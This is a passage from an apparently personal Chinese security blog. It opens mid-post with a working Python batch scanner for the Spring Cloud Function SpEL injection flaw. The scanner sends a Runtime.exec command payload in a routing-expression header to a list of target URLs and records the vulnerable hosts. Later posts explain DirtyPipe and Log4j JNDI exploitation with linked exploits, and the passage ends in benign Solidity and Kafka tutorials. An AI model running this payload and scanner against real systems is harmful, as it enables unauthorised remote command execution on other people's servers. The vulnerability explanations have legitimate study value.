class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">txt, cmd</span>):</span></span><br><span class="line">    path = <span class="string">&#x27;/functionRouter&#x27;</span></span><br><span class="line">    payload = <span class="string">f&#x27;T(java.lang.Runtime).getRuntime().exec(&quot;<span class="subst">&#123;cmd&#125;</span>&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;data&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;spring.cloud.function.routing-expression&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    f = <span class="built_in">open</span>(txt)</span><br><span class="line">    urllist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urllist:</span><br><span class="line">        url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">all</span> = url + path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.post(url=<span class="built_in">all</span>, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            code = req.status_code</span><br><span class="line">            text = req.text</span><br><span class="line">            rsp = <span class="string">&#x27;&quot;error&quot;:&quot;Internal Server Error&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> rsp <span class="keyword">in</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]<span class="subst">&#123;url&#125;</span> 存在漏洞&#x27;</span>)</span><br><span class="line">                poc_file = <span class="built_in">open</span>(<span class="string">&#x27;succ.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                poc_file.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                poc_file.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 不存在漏洞&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测超时&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测异常&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">        t = threading.Thread(target=test(cmd1, <span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;用法：&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;python XXX.py target.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit![0]&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">DirtyPipe学习分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-25 00:24:09" itemprop="dateCreated datePublished" datetime="2022-03-25T00:24:09+08:00">2022-03-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-03-27 22:06:08" itemprop="dateModified" datetime="2022-03-27T22:06:08+08:00">2022-03-27</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Dirty-Pipe学习"><a href="#Dirty-Pipe学习" class="headerlink" title="Dirty Pipe学习"></a>Dirty Pipe学习</h1><h4 id="漏洞编号："><a href="#漏洞编号：" class="headerlink" title="漏洞编号："></a>漏洞编号：</h4><p><code>CVE-2022-0847</code></p>
<h4 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h4><p>linux内核权限提升</p>
<h4 id="原理直击："><a href="#原理直击：" class="headerlink" title="原理直击："></a>原理直击：</h4><p>在 <code>splice</code> 中建立完页面映射后，此时 head 会指向下一个 <code>pipe_buffer</code>，此时我们再向管道中写入数据，管道计数器会发现上一个 <code>pipe_buffer</code> 没有写满，从而<strong>将数据拷贝到上一个 <strong><code>pipe_buffer</code></strong> 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p>
<p><code>splice</code>系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，当然也就有了越权读写的能力，但是无法在文件的边界进行读写。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h4><p>来自：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/11016</span><br><span class="line"></span><br><span class="line">原理是先将一个一个管道完全写满后读出一遍，为了给每个pipe_buffer上标志位，这个标志位可以让后面读取一个字节的文件进行读写操作。也就是越权读写，但是无法在文件的边界进行读写，因为这个边界也是对应pipe_buffer的边界，当其位于边界时无法触发管道读写的&quot;优化&quot;操作。也就无法进入到pipe_buffer的那个页面映射。</span><br></pre></td></tr></table></figure>


<h4 id="POC演示"><a href="#POC演示" class="headerlink" title="POC演示"></a>POC演示</h4><p><img src="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/image.png" alt="POC"></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>来源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://haxx.in/files/dirtypipez.c</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>EXP演示</p>
<p><img src="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/image_1.png" alt="EXP"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/01/01/Log4j%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/01/Log4j%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Log4j漏洞事件的相关技术学习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-01-01 02:09:27" itemprop="dateCreated datePublished" datetime="2022-01-01T02:09:27+08:00">2022-01-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2024-03-29 17:24:15" itemprop="dateModified" datetime="2024-03-29T17:24:15+08:00">2024-03-29</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Log4j漏洞事件的相关技术学习"><a href="#Log4j漏洞事件的相关技术学习" class="headerlink" title="Log4j漏洞事件的相关技术学习"></a>Log4j漏洞事件的相关技术学习</h1><h3 id="1-漏洞影响范围"><a href="#1-漏洞影响范围" class="headerlink" title="1.漏洞影响范围"></a>1.漏洞影响范围</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Log4j 2.x</span><br><span class="line">Apache旗下相关附属产品，如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink</span><br><span class="line"></span><br><span class="line">目前截止官方发布版本Log4j 2.17.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log4j中存在的JNDI Lookup原本是想提供给开发者能从远程服务器上接受相关配置及记录功能的，但是由于未对Lookup传入的参数进行过滤及检测，所以造成了相当大的影响范围及危险程度。</span><br></pre></td></tr></table></figure>


<h3 id="3-漏洞简单复现"><a href="#3-漏洞简单复现" class="headerlink" title="3.漏洞简单复现"></a>3.漏洞简单复现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境 </span><br><span class="line">  Java1.8.0_301、Log4j2.14.1-core、JNDIExploit-1.2-SNAPSHOT.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>源代码很简单，就是一个启动Logger并尝试让Logger记录一个错误的过程。</p>
<p>然后需要先启动一个恶意的JNDI的服务器，让后续的错误记录那一步可以调用到远程服务器上的命令即可完成远程命令执行。如下图</p>
<p><img src="/2022/01/01/Log4j%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/image.png" alt="复现"></p>
<ul>
<li>打码为了文章能活得久一点</li>
</ul>
<h3 id="Poc-amp-Exp"><a href="#Poc-amp-Exp" class="headerlink" title="Poc&amp;Exp"></a>Poc&amp;Exp</h3><p>简单来说就是恶意加载远程类造成的命令执行，目前的POC都是直接注入参数然后目标服务器为DNS的解析看是否存在返回，返回则该服务器受影响。</p>
<p>很多检测工具都是直接检测Jar包中是否存在Log4j-core的jar包引用。太粗暴了，不够优雅，也没有什么好一点的修复方案，不过看到了长亭的解决方式觉得非常有意思，值得学习一下，链接如下：</p>
<p><a target="_blank" rel="noopener" href="https://log4j2-detector.chaitin.cn/">https://log4j2-detector.chaitin.cn/</a></p>
<p>其中的agent.jar和loader.jar利用了Java中的Javassiast技术去动态修改Jar包中的Lookup函数并将其注空直接返回。对于出现紧急漏洞的修复情况这种方式非常优雅，也不会对原有业务造成影响。</p>
<ul>
<li>又学到了（RASP的这种实时修改非常适合做热修复的相关操作）</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2021/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%88%9D%E6%8E%A2-%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99%E5%90%88%E7%BA%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%88%9D%E6%8E%A2-%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99%E5%90%88%E7%BA%A6/" class="post-title-link" itemprop="url">区块链初探-尝试编写合约</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-17 12:32:34" itemprop="dateCreated datePublished" datetime="2021-07-17T12:32:34+08:00">2021-07-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2024-03-29 14:00:19" itemprop="dateModified" datetime="2024-03-29T14:00:19+08:00">2024-03-29</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Software/" itemprop="url" rel="index"><span itemprop="name">Software</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="1-创建-Solidity-源文件："><a href="#1-创建-Solidity-源文件：" class="headerlink" title="1.创建 Solidity 源文件："></a>1.创建 Solidity 源文件：</h2><p>打开 Remix IDE，这是一个在线的 Solidity 编辑器。<br>在左侧的文件资源管理器中，点击“contracts”文件夹，然后创建一个新的 .sol 文件，例如 HelloWorld.sol。</p>
<p>简单的sol合约代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123;</span><br><span class="line">    // 状态变量</span><br><span class="line">    string public greeting;</span><br><span class="line"></span><br><span class="line">    // 构造函数</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        greeting = &quot;Hello, World!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 函数：获取问候语</span><br><span class="line">    function getGreeting() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 函数：设置问候语</span><br><span class="line">    function setGreeting(string memory newGreeting) public &#123;</span><br><span class="line">        greeting = newGreeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码创建了一个名为 HelloWorld 的智能合约。<br><code>greeting</code> 是一个状态变量，用于存储问候语。<br><code>constructor</code> 是构造函数，在部署合约时初始化 <code>greeting</code>。<br><code>getGreeting</code> 函数用于获取问候语。<br><code>setGreeting</code> 函数用于设置新的问候语。</p>
<h2 id="2-编译智能合约："><a href="#2-编译智能合约：" class="headerlink" title="2.编译智能合约："></a>2.编译智能合约：</h2><p>在 Remix IDE 中，点击“Compile”选项卡，确保自动编译已勾选。<br>点击 HelloWorld.sol 文件，然后点击“Compile HelloWorld.sol”。</p>
<h2 id="3-部署智能合约："><a href="#3-部署智能合约：" class="headerlink" title="3.部署智能合约："></a>3.部署智能合约：</h2><p>在 Remix IDE 中，切换到“Deploy &amp; Run Transactions”选项卡。<br>选择合适的网络（例如 JavaScript VM 或 Injected Web3）。这里选择的时候也可以选择链接到自搭建的chain中。<br>点击“Deploy”按钮，部署合约。</p>
<h2 id="4-调用智能合约函数："><a href="#4-调用智能合约函数：" class="headerlink" title="4.调用智能合约函数："></a>4.调用智能合约函数：</h2><p>在 Remix IDE 中，切换到“Deployed Contracts”选项卡。<br>找到部署的 HelloWorld 合约。<br>使用 getGreeting 和 setGreeting 函数来获取和设置问候语。可以直接在remix网页中看到调用效果</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2021/07/14/kafka%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/07/14/kafka%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">kafka基础应用学习笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-07-14 20:09:48 / Modified: 20:10:33" itemprop="dateCreated datePublished" datetime="2021-07-14T20:09:48+08:00">2021-07-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Software/" itemprop="url" rel="index"><span itemprop="name">Software</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="kafka基础应用学习笔记"><a href="#kafka基础应用学习笔记" class="headerlink" title="kafka基础应用学习笔记"></a>kafka基础应用学习笔记</h1><blockquote>
<p>kafka：一种非常流行的消息中间件<br>人话：可以用这个框架解决消息在服务间传递的格式化及速度等问题，那么为什么要这么做呢？<br>答：因为快，而且方便。</p>
</blockquote>
<h3 id="解释kafka中的专业术语（个人理解）"><a href="#解释kafka中的专业术语（个人理解）" class="headerlink" title="解释kafka中的专业术语（个人理解）"></a>解释kafka中的专业术语（个人理解）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Producer：消息的生产者，消息从生产者传递至kafka处理 （做饭的）</span><br><span class="line"></span><br><span class="line">Consumer：消息的消费者，把消息从kafka中拿出（吃饭的）</span><br><span class="line"></span><br><span class="line">Consumer Group：消费者群组，就是把消费者们进行划分合并（吃饭排一个队的）</span><br><span class="line"></span><br><span class="line">Topic：标签，个人将其理解为一个标识，具有相同标识的生产者和消费者之间进行联系，读取特定的数据（打饭的窗口）</span><br><span class="line"></span><br><span class="line">Broker： kafka集群中包含的服务器节点（食堂）</span><br></pre></td></tr></table></figure>


<h3 id="搭建kafka"><a href="#搭建kafka" class="headerlink" title="搭建kafka"></a>搭建kafka</h3><p>可选择官网tgz包下载或直接docker搭建</p>
<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/kafka/">https://archive.apache.org/dist/kafka/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kafka启动需要zookeeper组件</span><br><span class="line">tgz包版：</span><br><span class="line">  <span class="variable">$root</span>&gt;<span class="built_in">cd</span> kafka_X.XX-X.X.X</span><br><span class="line">  <span class="variable">$root</span>&gt;bin/zookeeper-server-start.sh config/zookeeper.properties</span><br><span class="line">  </span><br><span class="line">然后启动kafkaserver</span><br><span class="line">  <span class="variable">$root</span>&gt;bin/kafka-server-start.sh config/server.properties</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>docker版：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$root</span>&gt;docker pull zookeeper </span><br><span class="line"><span class="variable">$root</span>&gt;docker run -it -p2888:2888 -p2181:2181 --name=zookeeper zookeeper</span><br><span class="line"></span><br><span class="line"><span class="comment">#到这步就是启动了zookeeper</span></span><br><span class="line"><span class="comment">#下面就是使用kafka链接zookeeper，可使用宿主机（前提是有java环境「使用java --version查看」）</span></span><br><span class="line"><span class="variable">$root</span>&gt; curl -O -L https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.6.0/kafka_2.12-2.6.0.tgz</span><br><span class="line"><span class="variable">$root</span>&gt;tar -zxvf kafka_2.12-2.6.0.tgz</span><br><span class="line"><span class="variable">$root</span>&gt;<span class="built_in">cd</span> kafka_2.12-2.6.0/</span><br><span class="line"><span class="variable">$root</span>&gt;bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure>


<p>利用了别人的镜像，避免重复造轮子（当然我喜欢自己造轮子所以我用的tgz ）</p>
<h3 id="一些基本操作"><a href="#一些基本操作" class="headerlink" title="一些基本操作"></a>一些基本操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建topic</span></span><br><span class="line">&gt;bin/kafka-topics.sh --create --zookeeper 【zookeeper server:port】 --replication-factor 1 --partitions 1 --topic 【topic name】</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本机的topic</span></span><br><span class="line">&gt;bin/kafka-topics.sh --zookeeper 【zookeeper server:port】 --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生产者身份连接kafka,这里会打开一个终端，向kafka中发送消息</span></span><br><span class="line">&gt;bin/kafka-console-producer.sh --broker-list 【zookeeper server:port】 --topic 【topic name】</span><br><span class="line">&gt;hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用消费者身份连接kafka，这里同样会打开一个终端，获取kafka中的信息</span></span><br><span class="line">&gt;bin/kafka-console-consumer.sh --bootstrap-server 【zookeeper server:port】 --topic 【topic name】 --from-beginning</span><br><span class="line">hello world </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除topic（先把kafka和zookeeper停了再操作）</span></span><br><span class="line">&gt;bin/kafka-topics --delete --zookeeper 【zookeeper server:port】 --topic 【topic name】</span><br><span class="line"><span class="comment">#然后删除topic的存储目录（server.properties文件log.dirs配置）“默认为/tmp/kafka-logs的topic相关目录”即可，查询显示还有的话，就重启一下将信息更新即可</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PS：说一下几个可能碰到的问题，</span></span><br><span class="line"><span class="comment"># 1.“唉，为啥我在虚拟机里面（docker里面）启动的kafka为啥局域网内拿python连不上啊？”</span></span><br><span class="line">答：“因为这玩意默认是本地localhost运行的，你要在config/server.properties内修改配置（看下图）“</span><br><span class="line"><span class="comment"># 2.&quot;唉，为啥我的kafka链接不了zookeeper啊？&quot;</span></span><br><span class="line">答：“你看下你的zookeeper启动在哪里，然后在config/server.properties内修改配置（同样看下图）”</span><br><span class="line"><span class="comment"># 3.&quot;md,sb博主，为啥我的topic删除不了？骗子！？？&quot;</span></span><br><span class="line">答：“你需要配置auto.create.topics.enable = <span class="literal">false</span>和delete.topic.enable=<span class="literal">true</span>” </span><br></pre></td></tr></table></figure>


<p><img src="/2021/07/14/kafka%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image.png" alt="配置1"></p>
<p><img src="/2021/07/14/kafka%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image_1.png" alt="配置2"></p>
<p>贴上我自己测试的python链接脚本，先启动消费者然后启动生产者</p>
<p>Producer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> kafka <span 